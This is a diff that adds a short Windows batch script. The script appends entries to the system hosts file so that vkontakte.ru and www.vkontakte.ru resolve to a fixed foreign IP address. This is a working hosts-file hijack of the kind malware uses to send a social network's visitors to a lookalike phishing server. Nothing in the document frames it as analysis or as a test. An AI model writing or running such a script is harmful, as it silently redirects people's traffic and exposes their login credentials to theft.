@@ -1,0 +1,5 @@
+@shift
+@echo off
+echo 61.150.91.136 www.vkontakte.ru >> %windir%\system32\drivers\etc\hosts
+echo 61.150.91.136 vkontakte.ru >> %windir%\system32\drivers\etc\hosts
+
